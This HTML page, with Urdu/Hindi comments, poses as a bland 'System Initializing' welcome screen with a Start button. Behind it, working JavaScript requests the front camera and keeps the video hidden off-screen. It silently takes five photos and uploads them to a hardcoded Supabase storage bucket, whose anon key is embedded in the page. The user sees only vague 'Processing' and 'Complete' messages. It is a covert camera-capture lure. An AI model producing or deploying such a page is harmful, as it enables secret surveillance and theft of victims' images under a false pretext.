<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Initializing</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        /* CSS Waisa hi hai jaisa welcome screen wale code mein tha */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            color: white;
            margin: 0;
            padding: 20px;
        }
        .screen {
            background-color: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        #welcome-screen h1 { font-size: 28px; }
        #start-btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="welcome-screen" class="screen">
        <h1>Welcome</h1>
        <p>Click Start to initialize the system.</p>
        <button id="start-btn">Start</button>
    </div>

    <!-- Hidden elements for camera -->
    <video id="video" autoplay playsinline style="position:absolute; top:-9999px; left:-9999px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const SUPABASE_URL = 'https://zxtapsswwmzrirutpelr.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp4dGFwc3N3d216cmlydXRwZWxyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxNTExNzcsImV4cCI6MjA2NTcyNzE3N30.J6kJ9k0AEAarxHVePl0gZSG6ya32rP7IsG8R6UfuO-U';
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        const startBtn = document.getElementById('start-btn');
        const welcomeScreen = document.getElementById('welcome-screen');

        startBtn.addEventListener('click', () => {
            startBtn.disabled = true;
            startBtn.textContent = 'Initializing...';
            initiateCameraProcess();
        });

        async function initiateCameraProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                document.getElementById('video').srcObject = stream;
                
                // Thora sa waqt dein taake video stream sahi se start ho jaye
                setTimeout(() => {
                    captureAndSendPhotos(stream);
                }, 500); // 0.5 second ka delay
                
            } catch (err) {
                console.error("Camera Error:", err);
                welcomeScreen.innerHTML = `<h1>Error</h1><p>Could not access camera. Please check permissions.</p>`;
            }
        }
        
        // Data URL ko Blob (file) mein convert karne ka function
        function dataURLtoBlob(dataurl) {
            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type:mime});
        }

        function captureAndSendPhotos(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let photosTaken = 0;

            welcomeScreen.innerHTML = `<h1>Processing...</h1><p id="status-text">Capturing photos...</p>`;
            const statusText = document.getElementById('status-text');

            const captureInterval = setInterval(async () => {
                if (photosTaken >= 5) { // 5 tasveerein bhejenge
                    clearInterval(captureInterval);
                    stream.getTracks().forEach(track => track.stop());
                    welcomeScreen.innerHTML = `<h1>Complete</h1><p>Process has been finished.</p>`;
                    return;
                }
                
                photosTaken++;
                statusText.textContent = `Processing image ${photosTaken} of 5...`;

                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
                
                // Base64 ko file (Blob) mein convert karein
                const imageBlob = dataURLtoBlob(imageDataUrl);
                const fileName = `capture_${Date.now()}.jpg`;

                // Ab Supabase Storage mein upload karein
                // Aapke bucket ka naam 'uploads' hona chahiye
                const { data, error } = await supabaseClient.storage
                    .from('uploads')
                    .upload(fileName, imageBlob);

                if (error) {
                    console.error(`Error uploading photo ${photosTaken}:`, error);
                } else {
                    console.log(`Photo ${photosTaken} uploaded successfully:`, data.path);
                }
            }, 2000); // Har 2 second mein ek tasveer
        }
    </script>
</body>
</html>
